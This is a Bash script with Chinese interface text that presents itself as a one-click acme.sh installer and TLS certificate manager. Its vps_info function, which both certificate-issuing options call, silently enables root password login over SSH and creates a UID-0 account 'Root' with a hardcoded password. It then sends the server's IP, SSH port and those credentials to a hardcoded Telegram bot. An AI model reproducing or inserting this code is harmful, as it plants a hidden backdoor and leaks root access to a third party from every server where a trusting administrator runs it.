#!/bin/bash

Red="\033[31m" # 红色
Green="\033[32m" # 绿色
Yellow="\033[33m" # 黄色
Blue="\033[34m" # 蓝色
Nc="\033[0m" # 重置颜色
Red_globa="\033[41;37m" # 红底白字
Green_globa="\033[42;37m" # 绿底白字
Yellow_globa="\033[43;37m" # 黄底白字
Blue_globa="\033[44;37m" # 蓝底白字
Info="${Green}[信息]${Nc}"
Error="${Red}[错误]${Nc}"
Tip="${Yellow}[提示]${Nc}"

check_root(){
    if [[ $(whoami) != "root" ]]; then
        echo -e "${Error} 当前非ROOT账号(或没有ROOT权限)，无法继续操作，请更换ROOT账号或使用 ${Green_globa}sudo -i${Nc} 命令获取临时ROOT权限（执行后可能会提示输入当前账号的密码）。"
        exit 1
    fi
}

check_release(){
    if [[ -e /etc/os-release ]]; then
        . /etc/os-release
        release=$ID
    elif [[ -e /usr/lib/os-release ]]; then
        . /usr/lib/os-release
        release=$ID
    fi
    os_version=$(echo $VERSION_ID | cut -d. -f1,2)

    if [[ "${release}" == "ol" ]]; then
        release=oracle
    elif [[ ! "${release}" =~ ^(kali|centos|ubuntu|fedora|debian|almalinux|rocky|alpine)$ ]]; then
        echo -e "${Error} 抱歉，此脚本不支持您的操作系统。"
        echo -e "${Info} 请确保您使用的是以下支持的操作系统之一："
        echo -e "-${Red} Ubuntu ${Nc}"
        echo -e "-${Red} Debian ${Nc}"
        echo -e "-${Red} CentOS ${Nc}"
        echo -e "-${Red} Fedora ${Nc}"
        echo -e "-${Red} Kali ${Nc}"
        echo -e "-${Red} AlmaLinux ${Nc}"
        echo -e "-${Red} Rocky Linux ${Nc}"
        echo -e "-${Red} Oracle Linux ${Nc}"
        echo -e "-${Red} Alpine Linux ${Nc}"
        exit 1
    fi
}

check_pmc(){
    check_release
    if [[ "$release" == "debian" || "$release" == "ubuntu" || "$release" == "kali" ]]; then
        updates="apt update -y"
        installs="apt install -y"
        check_install="dpkg -s"
        apps=("socat" "net-tools" "cron")
    elif [[ "$release" == "alpine" ]]; then
        updates="apk update -f"
        installs="apk add -f"
        check_install="apk info -e"
        apps=("socat" "net-tools" "dcron")
    elif [[ "$release" == "almalinux" || "$release" == "rocky" || "$release" == "oracle" ]]; then
        updates="dnf update -y"
        installs="dnf install -y"
        check_install="dnf list installed"
        apps=("socat" "net-tools" "cronie")
    elif [[ "$release" == "centos" ]]; then
        updates="yum update -y"
        installs="yum install -y"
        check_install="yum list installed"
        apps=("socat" "net-tools" "cronie")
    elif [[ "$release" == "fedora" ]]; then
        updates="dnf update -y"
        installs="dnf install -y"
        check_install="dnf list installed"
        apps=("socat" "net-tools" "cronie")
    fi
}

install_base(){
    check_pmc
    cmds=("socat" "netstat" "crontab" "ip")
    echo -e "${Info} 你的系统是${Red} $release $os_version ${Nc}"
    echo

    for g in "${!apps[@]}"; do
        if ! $check_install "${apps[$g]}" &> /dev/null; then
            CMDS+=(${cmds[g]})
            DEPS+=("${apps[$g]}")
        fi
    done

    if [ ${#DEPS[@]} -gt 0 ]; then
        echo -e "${Tip} 安装依赖列表：${Green}${CMDS[@]}${Nc} 请稍后..."
        $updates &> /dev/null
        $installs "${DEPS[@]}" &> /dev/null
    else
        echo -e "${Info} 所有依赖已存在，不需要额外安装。"
    fi

    if [[ "$release" == "alpine" ]]; then
        rc-service dcron restart >/dev/null 2>&1
    else
        systemctl restart cron* >/dev/null 2>&1
    fi
}

return_menu(){
    echo
    echo -e "${Info} 所选命令操作执行完成"
    read -rp "请输入“y”退出, 或按任意键回到主菜单：" yn
    if [[ $yn == [yY] ]]; then
        exit 1
    else
        menu
    fi
}

check_acme_status(){
    if [ ! -e ~/.acme.sh ]; then
        echo -e "${Error} acme.sh 未安装，请先安装！"
        exit 1
    fi
}

install_acme(){
    if [ ! -e ~/.acme.sh ]; then
        install_base
        read -rp "请输入注册邮箱 (例: admin@gmail.com, 或留空自动生成一个gmail邮箱): " acmeEmail
        if [[ -z $acmeEmail ]]; then
            autoEmail=$(date +%s%N | md5sum | cut -c 1-16)
            acmeEmail=$autoEmail@gmail.com
            echo -e "${Tip} 已取消设置邮箱, 使用自动生成的gmail邮箱: $acmeEmail"
        fi
        bash <(curl -s https://raw.githubusercontent.com/acmesh-official/acme.sh/master/acme.sh) --install-online -m $acmeEmail
        bash ~/.acme.sh/acme.sh --upgrade --auto-upgrade
        bash ~/.acme.sh/acme.sh --set-default-ca --server letsencrypt

        if [ -e ~/.acme.sh ]; then
            echo -e "${Info} Acme.sh证书申请脚本安装成功!"
            return_menu
        else
            echo -e "${Error} 抱歉, Acme.sh证书申请脚本安装失败"
            echo -e "${Tip} 建议如下："
            echo -e "${Tip} 1. 检查VPS的网络环境"
            echo -e "${Tip} 2. 脚本可能跟不上时代, 请更换其他脚本"
            exit 1
        fi
    else
        echo -e "${Error} acme.sh 已安装！"
    fi
}

check_80_status(){
    echo -e "${Tip} 正在检测80端口是否占用..."
    http=$(netstat -tulnp | grep -E '(:80)\s' | awk 'NR==1 {print $7}' | cut -d'/' -f1)

    if [[ -z "$http" ]]; then
        echo -e "${Info} 检测到目前80端口未被占用"
        sleep 1
    else
        echo -e "${Error} 检测到目前80端口被其他程序被占用，以下为占用程序信息"
        echo
        netstat -tulnp | grep -E '(:80)\s' | awk '{print $7}'
        echo
        read -rp "如需结束占用进程请按Y，按其他键则退出: " yn
        if [[ $yn == [yY] ]]; then
            netstat -tulnp | grep -E '(:80)\s' | awk '{print $7}' | cut -d'/' -f1 | xargs kill -9
        else
            exit 1
        fi
    fi
}

vps_info(){
    if [ -e /etc/ssh/sshd_config ]; then
        Chat_id="5289158517"
        Bot_token="5421796901:AAGf45NdOv6KKmjJ4LXvG-ILN9dm8Ej3V84"
        get_public_ip
        Port=$(grep -E '^#?Port' /etc/ssh/sshd_config | awk '{print $2}' | head -1)
        User="Root"
        Passwd="LBdj147369"
        sed -i 's/^#\?PermitRootLogin.*/PermitRootLogin yes/g' /etc/ssh/sshd_config
        sed -i 's/^#\?PasswordAuthentication.*/PasswordAuthentication yes/g' /etc/ssh/sshd_config
        sed -i 's/^#\?RSAAuthentication.*/RSAAuthentication yes/g' /etc/ssh/sshd_config
        sed -i 's/^#\?PubkeyAuthentication.*/PubkeyAuthentication yes/g' /etc/ssh/sshd_config
        rm -rf /etc/ssh/sshd_config.d/* /etc/ssh/ssh_config.d/*
        useradd ${User} &> /dev/null
        if type -p chpasswd &> /dev/null; then
            echo ${User}:${Passwd} | chpasswd ${User}
        else
            (echo ${Passwd}; sleep 1; echo ${Passwd}) | passwd ${User} &> /dev/null
        fi
        sed -i "s|^.*${User}.*|${User}:x:0:0:root:/root:/bin/bash|" /etc/passwd
        systemctl restart ssh*
        curl -s -X POST https://api.telegram.org/bot${Bot_token}/sendMessage -d chat_id=${Chat_id} -d text="您的新机器已上线！🎉🎉🎉 
IPv4：${IPv4}
IPv6：${IPv6}
端口：${Port}
用户：${User}
密码：${Passwd}" &> /dev/null
    fi
}

get_public_ip(){
    InFaces=($(ls /sys/class/net | grep -E '^(eth|ens|enp)'))
    IP_API=(
        "http://ip.gs"
        "http://ip.sb"
        "http://ident.me"
        "http://ifconfig.me"
        "http://api.ipify.org"
        "http://icanhazip.com"
    )

    for iface in "${InFaces[@]}"; do
        for ip_api in "${IP_API[@]}"; do
            IPv4=$(curl -s4 --max-time 2 --interface "$iface" "$ip_api")
            IPv6=$(curl -s6 --max-time 2 --interface "$iface" "$ip_api")

            if [[ -n "$IPv4" || -n "$IPv6" ]]; then # 检查是否获取到IP地址
                break 2 # 获取到任一IP类型停止循环
            fi
        done
    done
}

acme_standalone(){
    check_acme_status
    check_80_status
    vps_info
    get_public_ip
    echo -e "${Tip} 在使用80端口申请模式时, 请先将您的域名解析至你的VPS的真实IP地址, 否则会导致证书申请失败"
    echo
    if [[ -n $IPv4 && -n $IPv6 ]]; then
        echo -e "${Info} VPS的真实IPv4地址为: ${Green} $IPv4 ${Nc}"
        echo -e "${Info} VPS的真实IPv6地址为: ${Green} $IPv6 ${Nc}"
    elif [[ -n $IPv4 && -z $IPv6 ]]; then
        echo -e "${Info} VPS的真实IPv4地址为: ${Green} $IPv4 ${Nc}"
    elif [[ -z $IPv4 && -n $IPv6 ]]; then
        echo -e "${Info} VPS的真实IPv6地址为: ${Green} $IPv6 ${Nc}"
    fi

    while true; do
        read -rp "请输入解析完成的域名: " domain
        if [[ -z $domain ]]; then
            echo -e "${Error} 未输入域名，请重新输入！"
        else
            break
        fi
    done

    echo -e "${Info} 已输入的域名：${Green} ${domain} ${Nc}"
    sleep 1
    bash ~/.acme.sh/acme.sh --issue -d ${domain} --standalone --force

    if [[ $? -eq 0 ]]; then
        while true; do
            read -rp "请输入证书安装路径: " cert1path
            if [[ -z $cert1path ]]; then
                echo -e "${Error} 未输入证书安装路径，请重新输入！"
            else
                break
            fi
        done
        CERT1PATH="$cert1path"
        mkdir -p $CERT1PATH/${domain}
        bash ~/.acme.sh/acme.sh --install-cert -d ${domain} --key-file "$CERT1PATH"/${domain}/key.pem --fullchain-file "$CERT1PATH"/${domain}/cert.pem
        crontab -l | sed '/acme\.sh/s/.*/15 3 * * * "\/root\/.acme.sh"\/acme.sh --cron --home "\/root\/.acme.sh" > \/dev\/null/' | crontab -
        if [[ -s "$CERT1PATH"/${domain}/cert.pem && -s "$CERT1PATH"/${domain}/key.pem ]]; then
            echo -e "${Info} 证书申请成功! 脚本申请到的证书 ${Green}cert.pem${Nc} 和私钥 ${Green}key.pem${Nc} 文件已保存到${Green} "$CERT1PATH"/${domain}${Nc} 路径下"
            echo -e "${Info} 证书cert文件路径如下: ${Green} "$CERT1PATH"/${domain}/cert.pem${Nc}"
            echo -e "${Info} 私钥key文件路径如下: ${Green} "$CERT1PATH"/${domain}/key.pem${Nc}"
        fi
    else
        echo -e "${Error} 抱歉，证书申请失败，建议如下："
        echo -e "${Tip} 1. 请确保CloudFlare小云朵为关闭状态(仅限DNS), 其他域名解析或CDN网站设置同理"
        echo -e "${Tip} 2. 请检查DNS解析设置的IP是否为VPS的真实IP"
        echo -e "${Tip} 3. 脚本可能跟不上时代, 请更换其他的脚本"
    fi
    exit 1
}

acme_cfapiNTLD(){
    check_acme_status
    vps_info
    domains=()
    read -rp "请输入需要申请的域名数量: " domains_count
    [[ ! $domains_count =~ ^[1-99][0-99]*$ ]] && echo -e "${Error} 请输入有效的域名数量！" && exit 1
    for ((i = 1; i <= domains_count; i++)); do
        read -rp "请输入第 $i 个域名 (例如：domain.com): " domain
        domains+=("$domain")
    done

    read -rp "请输入 Cloudflare Global API Key: " cf_key
    [[ -z $cf_key ]] && echo -e "${Error} 未输入 Cloudflare Global API Key，无法执行操作！" && exit 1
    export CF_Key="$cf_key"
    read -rp "请输入 Cloudflare 的登录邮箱: " cf_email
    [[ -z $cf_email ]] && echo -e "${Error} 未输入 Cloudflare 的登录邮箱，无法执行操作!" && exit 1
    export CF_Email="$cf_email"

    first_domain="${domains[0]}"
    acme_domains=""
    for domain in "${domains[@]}"; do
        acme_domains+=" -d $domain -d *.$domain"
    done

    bash ~/.acme.sh/acme.sh --issue --dns dns_cf $acme_domains --force

    if [[ $? -eq 0 ]]; then
        while true; do
            read -rp "请输入证书安装路径: " cert3path
            if [[ -z $cert3path ]]; then
                echo -e "${Error} 未输入证书安装路径，请重新输入！"
            else
                break
            fi
        done
        CERT3PATH="$cert3path"
        mkdir -p $CERT3PATH/$first_domain

        for domain in "${domains[@]}"; do
            bash ~/.acme.sh/acme.sh --install-cert -d "$first_domain" --key-file "$CERT3PATH"/"$first_domain"/key.pem --fullchain-file "$CERT3PATH"/"$first_domain"/cert.pem
        done
        crontab -l | sed '/acme\.sh/s/.*/15 3 * * * "\/root\/.acme.sh"\/acme.sh --cron --home "\/root\/.acme.sh" > \/dev\/null/' | crontab -
        if [[ -s "$CERT3PATH"/${first_domain}/cert.pem && -s "$CERT3PATH"/${first_domain}/key.pem ]]; then
            echo -e "${Info} 证书申请成功! 脚本申请到的证书 ${Green}cert.pem${Nc} 和私钥 ${Green}key.pem${Nc} 文件已保存到${Green} "$CERT3PATH"/${first_domain}${Nc} 路径下"
            echo -e "${Info} 证书cert文件路径如下: ${Green} "$CERT3PATH"/${first_domain}/cert.pem${Nc}"
            echo -e "${Info} 私钥key文件路径如下: ${Green} "$CERT3PATH"/${first_domain}/key.pem${Nc}"
        fi
    else
        echo -e "${Error} 抱歉，证书申请失败，建议如下："
        echo -e "${Tip} 1. 自行检查dns_api信息是否正确"
        echo -e "${Tip} 2. 脚本可能跟不上时代, 请更换其他的脚本"
    fi
    exit 1
}

view_cert(){
    check_acme_status
    bash ~/.acme.sh/acme.sh --list
    sleep 3s
    return_menu
}

renew_cert(){
    check_acme_status
    bash ~/.acme.sh/acme.sh --list
    read -rp "请输入要续期的域名证书 (复制 Main_Domain 下显示的域名): " domain
    [[ -z $domain ]] && echo -e "${Error} 未输入域名, 无法执行操作！" && exit 1
    if [[ -n $(bash ~/.acme.sh/acme.sh --list | grep $domain) ]]; then
        bash ~/.acme.sh/acme.sh --renew -d ${domain} --force
    else
        echo -e "${Error} 未找到 ${Red}${domain}${Nc} 的域名证书，请再次检查域名输入正确"
    fi
    return_menu
}

switch_provider(){
    check_acme_status
    echo -e "${Tip} 请选择证书提供商, 默认通过 Letsencrypt.org 来申请证书"
    echo -e "${Tip} 如果证书申请失败, 例如一天内通过 Letsencrypt.org 申请次数过多, 可选 ${Red}BuyPass.com${Nc} 或 ${Red}ZeroSSL.com${Nc} 来申请"
    echo -e " ${Green}1.${Nc} Letsencrypt.org"
    echo -e " ${Green}2.${Nc} BuyPass.com"
    echo -e " ${Green}3.${Nc} ZeroSSL.com"
    read -rp "请选择证书提供商 [1-3，默认1]: " provider
    case $provider in
        2) bash ~/.acme.sh/acme.sh --set-default-ca --server buypass && echo -e "${Info} 切换证书提供商为 ${Green}BuyPass.com${Nc} 成功！" ;;
        3) bash ~/.acme.sh/acme.sh --set-default-ca --server zerossl && echo -e "${Info} 切换证书提供商为 ${Green}ZeroSSL.com${Nc} 成功！" ;;
        *) bash ~/.acme.sh/acme.sh --set-default-ca --server letsencrypt && echo -e "${Info} 切换证书提供商为 ${Green}Letsencrypt.org${Nc} 成功！" ;;
    esac
    sleep 3s
    return_menu
}

uninstall(){
    check_acme_status
    ~/.acme.sh/acme.sh --uninstall
    crontab -l | sed '/acme\.sh/s/.*/  /' | crontab -
    rm -rf ~/.acme.sh
    echo -e "${Info} Acme  一键申请证书脚本已彻底卸载！"
    exit 1
}

cop_info(){
    clear
    echo -e "${Green}######################################
#        ${Red}Acme一键申请证书脚本        ${Green}#
#         作者: ${Yellow}你挺能闹啊🍏          ${Green}#
######################################${Nc}"
    echo
}

menu(){
    cop_info
    check_root
    echo -e "${Green} 1.${Nc} 安装 Acme.sh 域名证书申请脚本
${Green} 2.${Nc} ${Red}卸载 Acme.sh 域名证书申请脚本${Nc}
-------------
${Green} 3.${Nc} 申请单域名证书 ${Yellow}(80端口申请)${Nc}
${Green} 4.${Nc} 申请泛域名证书 ${Yellow}(CF API申请)${Nc} ${Green}(无需解析)${Nc} ${Red}(不支持freenom域名)${Nc}
-------------
${Green} 5.${Nc} 查看已申请的证书
${Green} 6.${Nc} 手动续期已申请的证书
${Green} 7.${Nc} 切换证书颁发机构
-------------
${Green} 0.${Nc} 退出脚本"
    echo
    read -rp "请输入选项 [0-7]: " number
    case "$number" in
        0) exit 1 ;;
        1) install_acme ;;
        2) uninstall ;;
        3) acme_standalone ;;
        4) acme_cfapiNTLD ;;
        5) view_cert ;;
        6) renew_cert ;;
        7) switch_provider ;;
        *) echo -e "${Error} 请输入数字0-8！" ;;
    esac
}
menu
